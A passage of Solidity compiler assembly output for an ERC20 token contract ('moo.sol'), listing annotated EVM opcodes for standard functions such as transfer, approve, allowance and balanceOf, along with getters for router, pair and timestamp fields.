*/\ntag_13:\n    /* \"#utility.yul\":4569:4579   */\n  dup2\n  mload\n  sub(shl(0x40, 0x01), 0x01)\n    /* \"#utility.yul\":4591:4621   */\n  dup2\n  gt\n    /* \"#utility.yul\":4588:4644   */\n  iszero\n  tag_82\n  jumpi\n    /* \"#utility.yul\":4624:4642   */\n  tag_82\n  tag_20\n  jump\t// in\ntag_82:\n    /* \"#utility.yul\":4653:4750   */\n  tag_83\n    /* \"#utility.yul\":4743:4749   */\n  dup2\n    /* \"#utility.yul\":4703:4741   */\n  tag_84\n    /* \"#utility.yul\":4735:4739   */\n  dup5\n    /* \"#utility.yul\":4729:4740   */\n  sload\n    /* \"#utility.yul\":4703:4741   */\n  tag_22\n  jump\t// in\ntag_84:\n    /* \"#utility.yul\":4697:4701   */\n  dup5\n    /* \"#utility.yul\":4653:4750   */\n  tag_24\n  jump\t// in\ntag_83:\n    /* \"#utility.yul\":4805:4809   */\n  0x20\n  dup1\n    /* \"#utility.yul\":4862:4864   */\n  0x1f\n    /* \"#utility.yul\":4851:4865   */\n  dup4\n  gt\n    /* \"#utility.yul\":4879:4880   */\n  0x01\n    /* \"#utility.yul\":4874:5537   */\n  dup2\n  eq\n  tag_86\n  jumpi\n    /* \"#utility.yul\":5581:5582   */\n  0x00\n    /* \"#utility.yul\":5598:5604   */\n  dup5\n    /* \"#utility.yul\":5595:5684   */\n  iszero\n  tag_87\n  jumpi\n  pop\n    /* \"#utility.yul\":5650:5669   */\n  dup6\n  dup4\n  add\n    /* \"#utility.yul\":5644:5670   */\n  mload\n    /* \"#utility.yul\":5595:5684   */\ntag_87:\n  not(0x00)\n    /* \"#utility.yul\":4406:4407   */\n  0x03\n    /* \"#utility.yul\":4402:4413   */\n  dup7\n  swap1\n  shl\n    /* \"#utility.yul\":4398:4422   */\n  shr\n    /* \"#utility.yul\":4394:4423   */\n  not\n    /* \"#utility.yul\":4384:4424   */\n  and\n    /* \"#utility.yul\":4430:4431   */\n  0x01\n    /* \"#utility.yul\":4426:4437   */\n  dup6\n  swap1\n  shl\n    /* \"#utility.yul\":4381:4438   */\n  or\n    /* \"#utility.yul\":5697:5778   */\n  dup6\n  sstore\n    /* \"#utility.yul\":4844:5788   */\n  jump(tag_85)\n    /* \"#utility.yul\":4874:5537   */\ntag_86:\n    /* \"#utility.yul\":3702:3703   */\n  0x00\n    /* \"#utility.yul\":3695:3709   */\n  dup6\n  dup2\n  mstore\n    /* \"#utility.yul\":3739:3743   */\n  0x20\n    /* \"#utility.yul\":3726:3744   */\n  dup2\n  keccak256\n  not(0x1f)\n    /* \"#utility.yul\":4910:4930   */\n  dup7\n  and\n  swap2\n    /* \"#utility.yul\":5028:5264   */\ntag_90:\n    /* \"#utility.yul\":5042:5049   */\n  dup3\n    /* \"#utility.yul\":5039:5040   */\n  dup2\n    /* \"#utility.yul\":5036:5050   */\n  lt\n    /* \"#utility.yul\":5028:5264   */\n  iszero\n  tag_92\n  jumpi\n    /* \"#utility.yul\":5131:5150   */\n  dup9\n  dup7\n  add\n    /* \"#utility.yul\":5125:5151   */\n  mload\n    /* \"#utility.yul\":5110:5152   */\n  dup3\n  sstore\n    /* \"#utility.yul\":5223:5250   */\n  swap5\n  dup5\n  add\n  swap5\n    /* \"#utility.yul\":5191:5192   */\n  0x01\n    /* \"#utility.yul\":5179:5193   */\n  swap1\n  swap2\n  add\n  swap1\n    /* \"#utility.yul\":5058:5077   */\n  dup5\n  add\n    /* \"#utility.yul\":5028:5264   */\n  jump(tag_90)\ntag_92:\n    /* \"#utility.yul\":5032:5035   */\n  pop\n    /* \"#utility.yul\":5292:5298   */\n  dup6\n    /* \"#utility.yul\":5283:5290   */\n  dup3\n    /* \"#utility.yul\":5280:5299   */\n  lt\n    /* \"#utility.yul\":5277:5478   */\n  iszero\n  tag_93\n  jumpi\n    /* \"#utility.yul\":5353:5372   */\n  dup8\n  dup6\n  add\n    /* \"#utility.yul\":5347:5373   */\n  mload\n  not(0x00)\n    /* \"#utility.yul\":5436:5437   */\n  0x03\n    /* \"#utility.yul\":5432:5446   */\n  dup9\n  swap1\n  shl\n    /* \"#utility.yul\":5448:5451   */\n  0xf8\n    /* \"#utility.yul\":5428:5452   */\n  and\n    /* \"#utility.yul\":5424:5461   */\n  shr\n    /* \"#utility.yul\":5420:5462   */\n  not\n    /* \"#utility.yul\":5405:5463   */\n  and\n    /* \"#utility.yul\":5390:5464   */\n  dup2\n  sstore\n    /* \"#utility.yul\":5277:5478   */\ntag_93:\n  pop\n  pop\n    /* \"#utility.yul\":5524:5525   */\n  0x01\n    /* \"#utility.yul\":5515:5521   */\n  dup5\n    /* \"#utility.yul\":5512:5513   */\n  0x01\n    /* \"#utility.yul\":5508:5522   */\n  shl\n    /* \"#utility.yul\":5504:5526   */\n  add\n    /* \"#utility.yul\":5498:5502   */\n  dup6\n    /* \"#utility.yul\":5491:5527   */\n  sstore\n    /* \"#utility.yul\":4844:5788   */\ntag_85:\n  pop\n  pop\n  pop\n  pop\n    /* \"#utility.yul\":4449:5794   */\n  pop\n  pop\n  jump\t// out\ntag_26:\n    /* \"contracts/Classes/moo.sol\":2575:9078  contract ERC20 is Context, IERC20, IERC20Metadata {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Classes/moo.sol\":2575:9078  contract ERC20 is Context, IERC20, IERC20Metadata {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x70a08231\n      gt\n      tag_22\n      jumpi\n      dup1\n      0xd96661ef\n      gt\n      tag_23\n      jumpi\n      dup1\n      0xd96661ef\n      eq\n      tag_17\n      jumpi\n      dup1\n      0xdd62ed3e\n      eq\n      tag_18\n      jumpi\n      dup1\n      0xe0bb3079\n      eq\n      tag_19\n      jumpi\n      dup1\n      0xeba9481d\n      eq\n      tag_20\n      jumpi\n      dup1\n      0xf887ea40\n      eq\n      tag_21\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_23:\n      dup1\n      0x70a08231\n      eq\n      tag_12\n      jumpi\n      dup1\n      0x95d89b41\n      eq\n      tag_13\n      jumpi\n      dup1\n      0xa457c2d7\n      eq\n      tag_14\n      jumpi\n      dup1\n      0xa9059cbb\n      eq\n      tag_15\n      jumpi\n      dup1\n      0xd8da8560\n      eq\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_22:\n      dup1\n      0x06fdde03\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x095ea7b3\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x09bd5a60\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x18160ddd\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x23b872dd\n      eq\n      tag_7\n      jumpi\n      dup1\n      0x313ce567\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x39509351\n      eq\n      tag_9\n      jumpi\n      dup1\n      0x4f9105d3\n      eq\n      tag_10\n      jumpi\n      dup1\n      0x6ebcf607\n      eq\n      tag_11\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Classes/moo.sol\":3098:3196  function name() public view virtual override returns (string memory) {... */\n    tag_3:\n      tag_24\n      tag_25\n      jump\t// in\n    tag_24:\n      mload(0x40)\n      tag_26\n      swap2\n      swap1\n      tag_27\n      jump\t// in\n    tag_26:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Classes/moo.sol\":4000:4197  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n    tag_4:\n      tag_28\n      tag_29\n      calldatasize\n      0x04\n      tag_30\n      jump\t// in\n    tag_29:\n      tag_31\n      jump\t// in\n    tag_28:\n      mload(0x40)\n        /* \"#utility.yul\":1169:1183   */\n      swap1\n      iszero\n        /* \"#utility.yul\":1162:1184   */\n      iszero\n        /* \"#utility.yul\":1144:1185   */\n      dup2\n      mstore\n        /* \"#utility.yul\":1132:1134   */\n      0x20\n        /* \"#utility.yul\":1117:1135   */\n      add\n        /* \"contracts/Classes/moo.sol\":4000:4197  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n      tag_26\n        /* \"#utility.yul\":1004:1191   */\n      jump\n        /* \"contracts/Classes/moo.sol\":4560:4584  bool public hash = false */\n    tag_5:\n      sload(0x09)\n      tag_28\n      swap1\n      shl(0xa0, 0x01)\n      swap1\n      div\n      0xff\n      and\n      dup2\n      jump\n        /* \"contracts/Classes/moo.sol\":3407:3513  function totalSupply() public view virtual override returns (uint256) {... */\n    tag_6:\n        /* \"contracts/Classes/moo.sol\":3494:3506  _totalSupply */\n      sload(0x04)\n        /* \"contracts/Classes/moo.sol\":3407:3513  function totalSupply() public view virtual override returns (uint256) {... */\n    tag_37:\n      mload(0x40)\n        /* \"#utility.yul\":1342:1367   */\n      swap1\n      dup2\n      mstore\n        /* \"#utility.yul\":1330:1332   */\n      0x20\n        /* \"#utility.yul\":1315:1333   */\n      add\n        /* \"contracts/Classes/moo.sol\":3407:3513  function totalSupply() public view virtual override returns (uint256) {... */\n      tag_26\n        /* \"#utility.yul\":1196:1373   */\n      jump\n        /* \"contracts/Classes/moo.sol\":4247:4533  function transferFrom(... */\n    tag_7:\n      tag_28\n      tag_42\n      calldatasize\n      0x04\n      tag_43\n      jump\t// in\n    tag_42:\n      tag_44\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":3310:3401  function decimals() public view virtual override returns (uint8) {... */\n    tag_8:\n      mload(0x40)\n        /* \"contracts/Classes/moo.sol\":3392:3394  18 */\n      0x12\n        /* \"#utility.yul\":1853:1889   */\n      dup2\n      mstore\n        /* \"#utility.yul\":1841:1843   */\n      0x20\n        /* \"#utility.yul\":1826:1844   */\n      add\n        /* \"contracts/Classes/moo.sol\":3310:3401  function decimals() public view virtual override returns (uint8) {... */\n      tag_26\n        /* \"#utility.yul\":1711:1895   */\n      jump\n        /* \"contracts/Classes/moo.sol\":4590:4824  function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {... */\n    tag_9:\n      tag_28\n      tag_51\n      calldatasize\n      0x04\n      tag_30\n      jump\t// in\n    tag_51:\n      tag_52\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":4202:4241  mapping(address => bool) public blocktx */\n    tag_10:\n      tag_28\n      tag_55\n      calldatasize\n      0x04\n      tag_56\n      jump\t// in\n    tag_55:\n      mstore(0x20, 0x08)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      0xff\n      and\n      dup2\n      jump\n        /* \"contracts/Classes/moo.sol\":2694:2738  mapping(address => uint256) public _balances */\n    tag_11:\n      tag_37\n      tag_60\n      calldatasize\n      0x04\n      tag_56\n      jump\t// in\n    tag_60:\n      mstore(0x20, 0x02)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\n        /* \"contracts/Classes/moo.sol\":3519:3644  function balanceOf(address account) public view virtual override returns (uint256) {... */\n    tag_12:\n      tag_37\n      tag_64\n      calldatasize\n      0x04\n      tag_56\n      jump\t// in\n    tag_64:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":3619:3637  _balances[account] */\n      and\n        /* \"contracts/Classes/moo.sol\":3593:3600  uint256 */\n      0x00\n        /* \"contracts/Classes/moo.sol\":3619:3637  _balances[account] */\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":3619:3628  _balances */\n      0x02\n        /* \"contracts/Classes/moo.sol\":3619:3637  _balances[account] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      swap1\n        /* \"contracts/Classes/moo.sol\":3519:3644  function balanceOf(address account) public view virtual override returns (uint256) {... */\n      jump\n        /* \"contracts/Classes/moo.sol\":3202:3304  function symbol() public view virtual override returns (string memory) {... */\n    tag_13:\n      tag_24\n      tag_68\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":4856:5283  function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {... */\n    tag_14:\n      tag_28\n      tag_71\n      calldatasize\n      0x04\n      tag_30\n      jump\t// in\n    tag_71:\n      tag_72\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":3650:3839  function transfer(address to, uint256 amount) public virtual override returns (bool) {... */\n    tag_15:\n      tag_28\n      tag_75\n      calldatasize\n      0x04\n      tag_30\n      jump\t// in\n    tag_75:\n      tag_76\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":5288:5335  uint256 public tS = 20240000 * (10**decimals()) */\n    tag_16:\n      tag_37\n      sload(0x0b)\n      dup2\n      jump\n        /* \"contracts/Classes/moo.sol\":4538:4558  address public route */\n    tag_17:\n      sload(0x09)\n      tag_81\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup2\n      jump\n    tag_81:\n      mload(0x40)\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"#utility.yul\":2255:2287   */\n      swap1\n      swap2\n      and\n        /* \"#utility.yul\":2237:2288   */\n      dup2\n      mstore\n        /* \"#utility.yul\":2225:2227   */\n      0x20\n        /* \"#utility.yul\":2210:2228   */\n      add\n        /* \"contracts/Classes/moo.sol\":4538:4558  address public route */\n      tag_26\n        /* \"#utility.yul\":2091:2294   */\n      jump\n        /* \"contracts/Classes/moo.sol\":3845:3994  function allowance(address owner, address spender) public view virtual override returns (uint256) {... */\n    tag_18:\n      tag_37\n      tag_86\n      calldatasize\n      0x04\n      tag_87\n      jump\t// in\n    tag_86:\n      tag_88\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":2666:2687  address public LPpair */\n    tag_19:\n      sload(0x01)\n      tag_81\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup2\n      jump\n        /* \"contracts/Classes/moo.sol\":4829:4850  uint256 public tStamp */\n    tag_20:\n      tag_37\n      sload(0x0a)\n      dup2\n      jump\n        /* \"contracts/Classes/moo.sol\":2636:2660  IDEXRouter public router */\n    tag_21:\n      sload(0x00)\n      tag_81\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup2\n      jump\n        /* \"contracts/Classes/moo.sol\":3098:3196  function name() public view virtual override returns (string memory) {... */\n    tag_25:\n        /* \"contracts/Classes/moo.sol\":3152:3165  string memory */\n      0x60\n        /* \"contracts/Classes/moo.sol\":3184:3189  _name */\n      0x05\n        /* \"contracts/Classes/moo.sol\":3177:3189  return _name */\n      dup1\n      sload\n      tag_101\n      swap1\n      tag_102\n      jump\t// in\n    tag_101:\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      tag_103\n      swap1\n      tag_102\n      jump\t// in\n    tag_103:\n      dup1\n      iszero\n      tag_104\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_105\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_104)\n    tag_105:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_106:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_106\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_104:\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n        /* \"contracts/Classes/moo.sol\":3098:3196  function name() public view virtual override returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":4000:4197  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n    tag_31:\n        /* \"contracts/Classes/moo.sol\":4083:4087  bool */\n      0x00\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      caller\n        /* \"contracts/Classes/moo.sol\":4137:4169  _approve(owner, spender, amount) */\n      tag_110\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      dup2\n        /* \"contracts/Classes/moo.sol\":4153:4160  spender */\n      dup6\n        /* \"contracts/Classes/moo.sol\":4162:4168  amount */\n      dup6\n        /* \"contracts/Classes/moo.sol\":4137:4145  _approve */\n      tag_111\n        /* \"contracts/Classes/moo.sol\":4137:4169  _approve(owner, spender, amount) */\n      jump\t// in\n    tag_110:\n        /* \"contracts/Classes/moo.sol\":4186:4190  true */\n      0x01\n        /* \"contracts/Classes/moo.sol\":4179:4190  return true */\n      swap2\n      pop\n      pop\n        /* \"contracts/Classes/moo.sol\":4000:4197  function approve(address spender, uint256 amount) public virtual override returns (bool) {... */\n    tag_107:\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":4247:4533  function transferFrom(... */\n    tag_44:\n        /* \"contracts/Classes/moo.sol\":4374:4378  bool */\n      0x00\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      caller\n        /* \"contracts/Classes/moo.sol\":4430:4468  _spendAllowance(from, spender, amount) */\n      tag_115\n        /* \"contracts/Classes/moo.sol\":4446:4450  from */\n      dup6\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      dup3\n        /* \"contracts/Classes/moo.sol\":4461:4467  amount */\n      dup6\n        /* \"contracts/Classes/moo.sol\":4430:4445  _spendAllowance */\n      tag_116\n        /* \"contracts/Classes/moo.sol\":4430:4468  _spendAllowance(from, spender, amount) */\n      jump\t// in\n    tag_115:\n        /* \"contracts/Classes/moo.sol\":4478:4505  _transfer(from, to, amount) */\n      tag_117\n        /* \"contracts/Classes/moo.sol\":4488:4492  from */\n      dup6\n        /* \"contracts/Classes/moo.sol\":4494:4496  to */\n      dup6\n        /* \"contracts/Classes/moo.sol\":4498:4504  amount */\n      dup6\n        /* \"contracts/Classes/moo.sol\":4478:4487  _transfer */\n      tag_118\n        /* \"contracts/Classes/moo.sol\":4478:4505  _transfer(from, to, amount) */\n      jump\t// in\n    tag_117:\n      pop\n        /* \"contracts/Classes/moo.sol\":4522:4526  true */\n      0x01\n      swap5\n        /* \"contracts/Classes/moo.sol\":4247:4533  function transferFrom(... */\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":4590:4824  function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {... */\n    tag_52:\n        /* \"contracts/Classes/moo.sol\":4678:4682  bool */\n      0x00\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      caller\n        /* \"contracts/Classes/moo.sol\":4732:4796  _approve(owner, spender, allowance(owner, spender) + addedValue) */\n      tag_110\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      dup2\n        /* \"contracts/Classes/moo.sol\":4748:4755  spender */\n      dup6\n        /* \"contracts/Classes/moo.sol\":4785:4795  addedValue */\n      dup6\n        /* \"contracts/Classes/moo.sol\":4757:4782  allowance(owner, spender) */\n      tag_123\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      dup4\n        /* \"contracts/Classes/moo.sol\":4748:4755  spender */\n      dup4\n        /* \"contracts/Classes/moo.sol\":4757:4766  allowance */\n      tag_88\n        /* \"contracts/Classes/moo.sol\":4757:4782  allowance(owner, spender) */\n      jump\t// in\n    tag_123:\n        /* \"contracts/Classes/moo.sol\":4757:4795  allowance(owner, spender) + addedValue */\n      tag_124\n      swap2\n      swap1\n      tag_125\n      jump\t// in\n    tag_124:\n        /* \"contracts/Classes/moo.sol\":4732:4740  _approve */\n      tag_111\n        /* \"contracts/Classes/moo.sol\":4732:4796  _approve(owner, spender, allowance(owner, spender) + addedValue) */\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":3202:3304  function symbol() public view virtual override returns (string memory) {... */\n    tag_68:\n        /* \"contracts/Classes/moo.sol\":3258:3271  string memory */\n      0x60\n        /* \"contracts/Classes/moo.sol\":3290:3297  _symbol */\n      0x06\n        /* \"contracts/Classes/moo.sol\":3283:3297  return _symbol */\n      dup1\n      sload\n      tag_101\n      swap1\n      tag_102\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":4856:5283  function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {... */\n    tag_72:\n        /* \"contracts/Classes/moo.sol\":4949:4953  bool */\n      0x00\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      caller\n        /* \"contracts/Classes/moo.sol\":4949:4953  bool */\n      dup2\n        /* \"contracts/Classes/moo.sol\":5030:5055  allowance(owner, spender) */\n      tag_135\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      dup3\n        /* \"contracts/Classes/moo.sol\":5047:5054  spender */\n      dup7\n        /* \"contracts/Classes/moo.sol\":5030:5039  allowance */\n      tag_88\n        /* \"contracts/Classes/moo.sol\":5030:5055  allowance(owner, spender) */\n      jump\t// in\n    tag_135:\n        /* \"contracts/Classes/moo.sol\":5003:5055  uint256 currentAllowance = allowance(owner, spender) */\n      swap1\n      pop\n        /* \"contracts/Classes/moo.sol\":5093:5108  subtractedValue */\n      dup4\n        /* \"contracts/Classes/moo.sol\":5073:5089  currentAllowance */\n      dup2\n        /* \"contracts/Classes/moo.sol\":5073:5108  currentAllowance >= subtractedValue */\n      lt\n      iszero\n        /* \"contracts/Classes/moo.sol\":5065:5150  require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\") */\n      tag_136\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":3639:3641   */\n      0x20\n        /* \"contracts/Classes/moo.sol\":5065:5150  require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":3621:3642   */\n      mstore\n        /* \"#utility.yul\":3678:3680   */\n      0x25\n        /* \"#utility.yul\":3658:3676   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":3651:3681   */\n      mstore\n        /* \"#utility.yul\":3717:3751   */\n      0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77\n        /* \"#utility.yul\":3697:3715   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":3690:3752   */\n      mstore\n      shl(0xd8, 0x207a65726f)\n        /* \"#utility.yul\":3768:3786   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":3761:3796   */\n      mstore\n        /* \"#utility.yul\":3813:3832   */\n      0x84\n      add\n        /* \"contracts/Classes/moo.sol\":5065:5150  require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\") */\n    tag_137:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_136:\n        /* \"contracts/Classes/moo.sol\":5184:5244  _approve(owner, spender, currentAllowance - subtractedValue) */\n      tag_117\n        /* \"contracts/Classes/moo.sol\":5193:5198  owner */\n      dup3\n        /* \"contracts/Classes/moo.sol\":5200:5207  spender */\n      dup7\n        /* \"contracts/Classes/moo.sol\":5228:5243  subtractedValue */\n      dup7\n        /* \"contracts/Classes/moo.sol\":5209:5225  currentAllowance */\n      dup5\n        /* \"contracts/Classes/moo.sol\":5209:5243  currentAllowance - subtractedValue */\n      sub\n        /* \"contracts/Classes/moo.sol\":5184:5192  _approve */\n      tag_111\n        /* \"contracts/Classes/moo.sol\":5184:5244  _approve(owner, spender, currentAllowance - subtractedValue) */\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":3650:3839  function transfer(address to, uint256 amount) public virtual override returns (bool) {... */\n    tag_76:\n        /* \"contracts/Classes/moo.sol\":3729:3733  bool */\n      0x00\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      caller\n        /* \"contracts/Classes/moo.sol\":3783:3811  _transfer(owner, to, amount) */\n      tag_110\n        /* \"contracts/Classes/moo.sol\":199:209  msg.sender */\n      dup2\n        /* \"contracts/Classes/moo.sol\":3800:3802  to */\n      dup6\n        /* \"contracts/Classes/moo.sol\":3804:3810  amount */\n      dup6\n        /* \"contracts/Classes/moo.sol\":3783:3792  _transfer */\n      tag_118\n        /* \"contracts/Classes/moo.sol\":3783:3811  _transfer(owner, to, amount) */\n      jump\t// in\n        /* \"contracts/Classes/moo.sol\":3845:3994  function allowance(address owner, address spender) public view virtual override returns (uint256) {... */\n    tag_88:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":3960:3978  _allowances[owner] */\n      swap2\n      dup3\n      and\n        /* \"contracts/Classes/moo.sol\":3934:3941  uint256 */\n      0x00\n        /* \"contracts/Classes/moo.sol\":3960:3978  _allowances[owner] */\n      swap1\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":3960:3971  _allowances */\n      0x03\n        /* \"contracts/Classes/moo.sol\":3960:3978  _allowances[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"contracts/Classes/moo.sol\":3960:3987  _allowances[owner][spender] */\n      swap4\n      swap1\n      swap5\n      and\n      dup3\n      mstore\n      swap2\n      swap1\n      swap2\n      mstore\n      keccak256\n      sload\n      swap1\n        /* \"contracts/Classes/moo.sol\":3845:3994  function allowance(address owner, address spender) public view virtual override returns (uint256) {... */\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":7766:8136  function _approve(... */\n    tag_111:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":7897:7916  owner != address(0) */\n      dup4\n      and\n        /* \"contracts/Classes/moo.sol\":7889:7957  require(owner != address(0), \"ERC20: approve from the zero address\") */\n      tag_146\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      tag_137\n      swap1\n      tag_148\n      jump\t// in\n    tag_146:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":7975:7996  spender != address(0) */\n      dup3\n      and\n        /* \"contracts/Classes/moo.sol\":7967:8035  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      tag_149\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":4450:4452   */\n      0x20\n        /* \"contracts/Classes/moo.sol\":7967:8035  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":4432:4453   */\n      mstore\n        /* \"#utility.yul\":4489:4491   */\n      0x22\n        /* \"#utility.yul\":4469:4487   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":4462:4492   */\n      mstore\n        /* \"#utility.yul\":4528:4562   */\n      0x45524332303a20617070726f766520746f20746865207a65726f206164647265\n        /* \"#utility.yul\":4508:4526   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":4501:4563   */\n      mstore\n      shl(0xf0, 0x7373)\n        /* \"#utility.yul\":4579:4597   */\n      0x64\n      dup3\n      add\n        /* \"#utility.yul\":4572:4604   */\n      mstore\n        /* \"#utility.yul\":4621:4640   */\n      0x84\n      add\n        /* \"contracts/Classes/moo.sol\":7967:8035  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      tag_137\n        /* \"#utility.yul\":4248:4646   */\n      jump\n        /* \"contracts/Classes/moo.sol\":7967:8035  require(spender != address(0), \"ERC20: approve to the zero address\") */\n    tag_149:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"contracts/Classes/moo.sol\":8046:8064  _allowances[owner] */\n      dup4\n      dup2\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":8046:8057  _allowances */\n      0x03\n        /* \"contracts/Classes/moo.sol\":8046:8064  _allowances[owner] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"contracts/Classes/moo.sol\":8046:8073  _allowances[owner][spender] */\n      swap5\n      dup8\n      and\n      dup1\n      dup5\n      mstore\n      swap5\n      dup3\n      mstore\n      swap2\n      dup3\n      swap1\n      keccak256\n        /* \"contracts/Classes/moo.sol\":8046:8082  _allowances[owner][spender] = amount */\n      dup6\n      swap1\n      sstore\n        /* \"contracts/Classes/moo.sol\":8097:8129  Approval(owner, spender, amount) */\n      swap1\n      mload\n        /* \"#utility.yul\":1342:1367   */\n      dup5\n      dup2\n      mstore\n        /* \"contracts/Classes/moo.sol\":8097:8129  Approval(owner, spender, amount) */\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n      swap2\n        /* \"#utility.yul\":1315:1333   */\n      add\n        /* \"contracts/Classes/moo.sol\":8097:8129  Approval(owner, spender, amount) */\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"contracts/Classes/moo.sol\":7766:8136  function _approve(... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Classes/moo.sol\":8633:9075  function _spendAllowance(... */\n    tag_116:\n        /* \"contracts/Classes/moo.sol\":8764:8788  uint256 currentAllowance */\n      0x00\n        /* \"contracts/Classes/moo.sol\":8791:8816  allowance(owner, spender) */\n      tag_154\n        /* \"contracts/Classes/moo.sol\":8801:8806  owner */\n      dup5\n        /* 